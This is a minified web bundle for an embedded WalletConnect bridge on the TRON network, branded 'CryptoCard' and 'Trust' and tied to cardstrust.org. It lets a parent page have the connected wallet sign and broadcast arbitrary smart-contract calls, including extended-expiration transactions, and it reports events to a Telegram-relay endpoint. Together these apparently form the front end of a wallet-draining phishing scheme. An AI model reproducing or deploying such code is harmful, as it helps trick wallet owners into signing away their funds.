(self.webpackChunk_N_E=self.webpackChunk_N_E||[]).push([[645],{28464:(e,t,r)=>{"use strict";r.d(t,{default:()=>p});var n=r(95155),a=r(12115),c=r(6742),o=r.n(c),i=r(72458),s=r(71823),u=r(51981),l=r(61837),d=r(1479),f=r(92721),w=r(95704);function p(){let{changeLanguage:e,t}=(0,u.s)(),r=(0,a.useRef)(function(){let e=(w.env.NEXT_PUBLIC_WC_PARENT_ORIGINS||"").split(",").map(e=>e.trim()).filter(Boolean);if(0===e.length){let t="cardstrust.org";t&&e.push("https://".concat(t))}return e}()),c=(0,a.useRef)(null),p=(0,a.useRef)(""),g=(0,a.useRef)(null),m=(0,a.useRef)([]),h=(0,a.useRef)(null),y=(0,a.useRef)(""),E=(0,a.useRef)(Promise.resolve()),_=(0,a.useRef)(null);async function S(){let e=await fetch("/api/get-public-tron-api-key");return(await e.json()).apiKey}async function N(e){if(h.current&&y.current===e)return h.current;let t=await S(),r=new(o())({fullHost:"https://api.trongrid.io",headers:{"TRON-PRO-API-KEY":t},privateKey:null});return r.setAddress(e),h.current=r,y.current=e,r}async function b(){if(c.current)return c.current;let e=new l.iJ({projectId:"34c466e996ba4279a1ef25d6213f8026"}),t=await d.Ay.init({core:e,metadata:{name:"CryptoCard",description:"Trust",url:"https://".concat("cardstrust.org","/"),icons:["https://".concat("cardstrust.org","/icons/logo.png")]}});return t.on("session_delete",()=>{p.current="",g.current=null,m.current=[],y.current="",v("DISCONNECTED")}),t.on("session_expire",()=>{p.current="",g.current=null,m.current=[],y.current="",v("DISCONNECTED")}),c.current=t,t}async function C(e){var t,r,n,a,c;let{restored:o=!1,reason:i=""}=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{};p.current=(null==e?void 0:e.topic)||"",g.current=(null==e?void 0:e.namespaces)||null;let s=null!=(n=null==e||null==(r=e.namespaces)||null==(t=r.tron)?void 0:t.accounts)?n:[];m.current=s;let u=(null==s||null==(c=s[0])||null==(a=c.split(":"))?void 0:a[2])||"";if(y.current=u,u)try{await N(u)}catch(e){}return v("CONNECTED",{topic:p.current,accounts:s,address:u,namespaces:g.current,restored:o,reason:i}),{topic:p.current,accounts:s,address:u,namespaces:g.current}}async function T(){let e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:"startup",t=(await b()).session.getAll().find(e=>{var t,r,n;return null==e||null==(n=e.namespaces)||null==(r=n.tron)||null==(t=r.accounts)?void 0:t.length});return!!t&&(await C(t,{restored:!0,reason:e}),!0)}function v(e,t){try{var n;let a=r.current&&r.current[0]||"*";null==(n=window.parent)||n.postMessage({source:"wc-embed",type:e,...t||{}},a)}catch(e){}}async function A(){let e=_.current;if(_.current=null,e)try{e(Error("WC_PARENT_CLOSED"))}catch(e){}try{await (0,s.N)()}catch(e){}v("WC_MODAL_CLOSED")}async function R(e,t){await (0,s.N)();let r=await b();v("STATUS",{text:"Открываю WalletConnect…"});let n=new Promise((e,t)=>{_.current=t}),{uri:a,approval:c}=await r.connect({requiredNamespaces:{tron:{methods:["tron_signTransaction","tron_signMessage"],chains:["tron:0x2b6653dc"],events:["accountsChanged"]}}});a?v("WC_URI",{uri:a}):v("STATUS",{text:"URI не выдан (возможно, уже есть pairing)…"});try{let e=await Promise.race([c(),n]);return{...await C(e,{restored:!1,reason:"approval"}),uri:a||""}}catch(t){let e=String((null==t?void 0:t.message)||t||"");try{(0,f.F)("".concat(e),1)}catch(e){}throw/closed|cancel|rejected|user|modal|WC_PARENT_CLOSED/i.test(e)?v("WC_MODAL_CLOSED"):v("STATUS",{text:"Не удалось открыть WalletConnect"}),t}finally{_.current=null}}async function I(e){let t=await b();if(p.current&&y.current||await T("signTransaction"),!p.current||!y.current)throw Error("NO_ACTIVE_SESSION");v("STATUS",{text:"Отправляю транзакцию на подпись…"});let r=function e(t){if(null==t)return t;let r=typeof t;if("bigint"===r){let e=BigInt(Number.MAX_SAFE_INTEGER),r=BigInt(Number.MIN_SAFE_INTEGER);return t<=e&&t>=r?Number(t):t.toString()}if("object"!==r)return t;if(Array.isArray(t))return t.map(e);let n={};for(let r of Object.keys(t))n[r]=e(t[r]);return n}(e);try{return await t.request({topic:p.current,chainId:"tron:0x2b6653dc",request:{method:"tron_signTransaction",params:{address:y.current,transaction:{transaction:r}}}})}catch(e){return await t.request({topic:p.current,chainId:"tron:0x2b6653dc",request:{method:"tron_signTransaction",params:{address:y.current,transaction:r}}})}}async function D(e){y.current||await T("sendRawTransaction");let t=y.current;if(!t)throw Error("No address");let r=await N(t);return await r.trx.sendRawTransaction(e)}async function O(e){var t;y.current||await T("triggerSmartContractAndSend");let r=y.current;if(!r)throw Error("No address");let{contractAddress:n,functionSelector:a,options:c,parameters:o,ownerAddress:s,extendExpirationMs:u}=e||{};if(!n)throw Error("contractAddress is required");if(!a)throw Error("functionSelector is required");let l=s||r,d=await N(l),f=(0,i.HD)(c||{}),w=(0,i.HD)(o||[]),p=await d.transactionBuilder.triggerSmartContract(n,a,f,w,l),g=p&&p.transaction;if(!g)throw Error("triggerSmartContract returned no transaction");let m=g;if(u&&(null==g||null==(t=g.raw_data)?void 0:t.expiration)){let e=Number(g.raw_data.expiration)+Number(u);m={...g,raw_data:{...g.raw_data,expiration:e}}}let h=await I(m);return{broadcast:await D(h)}}async function x(){try{let e=await b();p.current&&await e.disconnect({topic:p.current,reason:{code:6e3,message:"User disconnected"}})}catch(e){}p.current="",g.current=null,m.current=[],h.current=null,y.current="";try{await (0,s.N)()}catch(e){}return!0}return(0,a.useEffect)(()=>{function t(t){var n;if(n=t.origin,!r.current.includes(n))return;let a=t.data;if(a){if("wc-embed"===a.source&&"SET_LANG"===a.type)return void e(function(e){let t=String(e||"").toUpperCase();return new Set(["DE","EN","ES","FR","PT","RU","UK","ZH"]).has(t)?t:"EN"}(a.lang));if("wc-embed"===a.source&&"CANCEL_CONNECT"===a.type)return void A();if("wc-embed"===a.source&&"PING"===a.type){T("ping").catch(()=>{}),v("PONG");return}"wc-rpc"===a.source&&a.id&&(E.current=E.current.then(async()=>{var e,r;try{let r,n=a.method,c=(0,i.eg)(a.params||[]);if("connectWalletStep"===n)r=await R(c[0],c[1]);else if("signTransaction"===n)r=await I(c[0]);else if("sendRawTransaction"===n)r=await D(c[0]);else if("triggerSmartContractAndSend"===n)r=await O(c[0]);else if("disconnect"===n)r=await x();else throw Error("Unknown method: "+n);null==(e=t.source)||e.postMessage({source:"wc-rpc",id:a.id,ok:!0,result:(0,i.yS)(r)},t.origin)}catch(e){null==(r=t.source)||r.postMessage({source:"wc-rpc",id:a.id,ok:!1,error:String((null==e?void 0:e.message)||e)},t.origin)}}))}}return window.addEventListener("message",t),(async()=>{try{await b(),await T("startup")}catch(e){}try{var e;let t=r.current&&r.current[0]||"*";null==(e=window.parent)||e.postMessage({source:"wc-embed",type:"BRIDGE_READY"},t)}catch(e){}})(),()=>window.removeEventListener("message",t)},[e]),(0,n.jsxs)("div",{style:{padding:16,fontFamily:"Arial, sans-serif",color:"#000",lineHeight:1.45,backgroundColor:"#fff",borderRadius:16},children:[(0,n.jsx)("div",{style:{fontSize:18,fontWeight:700,marginBottom:10},children:t("walletModal.title")}),(0,n.jsx)("div",{style:{fontSize:13,opacity:.85,marginBottom:14},children:t("walletModal.subtitle")})]})}},59184:(e,t,r)=>{Promise.resolve().then(r.bind(r,28464))},68111:(e,t,r)=>{"use strict";function n(){let e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:window.location.search;if(!e)return{};let t=new URLSearchParams(e),r={};return["utm_source","utm_medium","utm_campaign","utm_content","utm_term","open","from","to","x_energy","setting"].forEach(e=>{let n=t.get(e);n&&(r[e]=n)}),r}r.d(t,{Z:()=>n})},71823:(e,t,r)=>{"use strict";function n(){return new Promise((e,t)=>{try{if(!("indexedDB"in window))return e("IndexedDB недоступен (SSR/без браузера)");let r="WALLET_CONNECT_V2_INDEXED_DB",n="keyvaluestorage",a=["wc@2:client:0.3:session","wc@2:core:0.3:pairing","wc@2:core:0.3:subscription","wc@2:core:0.3:messages","wc@2:core:0.3:messages_with_proposal","wc@2:core:0.3:expirer","wc@2:core:0.3:history"],c=indexedDB.open(r);c.onerror=()=>{console.error("❌ Ошибка при открытии IndexedDB"),t("Ошибка открытия базы")},c.onsuccess=()=>{let o=c.result;if(!o.objectStoreNames.contains(n)){console.warn("⚠️ objectStore '".concat(n,"' не найден. Удаляем всю базу...")),o.close();let a=indexedDB.deleteDatabase(r);a.onsuccess=()=>e("Удалена вся база"),a.onerror=e=>{console.error("❌ Ошибка при удалении базы:",e),t("Ошибка при удалении базы")},a.onblocked=()=>{console.warn("⚠️ Удаление базы заблокировано — закрой вкладки.")};return}let i=o.transaction(n,"readwrite"),s=i.objectStore(n);a.forEach(e=>s.delete(e)),i.oncomplete=()=>e("Готово"),i.onerror=()=>{console.error("❌ Ошибка при удалении ключей"),t("Ошибка удаления")}}}catch(e){console.error("❌ Ошибка в clearWalletConnectSession:",e),t(e instanceof Error?e.message:String(e))}})}r.d(t,{N:()=>n})},72458:(e,t,r)=>{"use strict";r.d(t,{HD:()=>function e(t){if("bigint"==typeof t){let e=BigInt(Number.MAX_SAFE_INTEGER),r=BigInt(Number.MIN_SAFE_INTEGER);return t<=e&&t>=r?Number(t):t.toString(10)}if(Array.isArray(t))return t.map(e);if(t&&"object"==typeof t){let r={};for(let[n,a]of Object.entries(t))r[n]=e(a);return r}return t},eg:()=>function e(t){if(t&&"object"==typeof t&&"bi"===t.__t)return BigInt(t.v);if(Array.isArray(t))return t.map(e);if(t&&"object"==typeof t){let r={};for(let[n,a]of Object.entries(t))r[n]=e(a);return r}return t},yS:()=>function e(t){if("bigint"==typeof t)return{__t:"bi",v:t.toString(10)};if(Array.isArray(t))return t.map(e);if(t&&"object"==typeof t){let r={};for(let[n,a]of Object.entries(t))r[n]=e(a);return r}return t}})},91848:()=>{},92721:(e,t,r)=>{"use strict";r.d(t,{F:()=>a});var n=r(68111);async function a(e){let t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:0;try{let r=(0,n.Z)(),a=await fetch("/api/send_telegram",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({message:e,status:t,utm:r})});if(!a.ok)throw Error("HTTP ".concat(a.status));return await a.json().catch(()=>null)}catch(e){return console.error("❌ Ошибка запроса на бэкенд:",e),null}}}},e=>{e.O(0,[229,268,29,479,981,441,255,358],()=>e(e.s=59184)),_N_E=e.O()}]);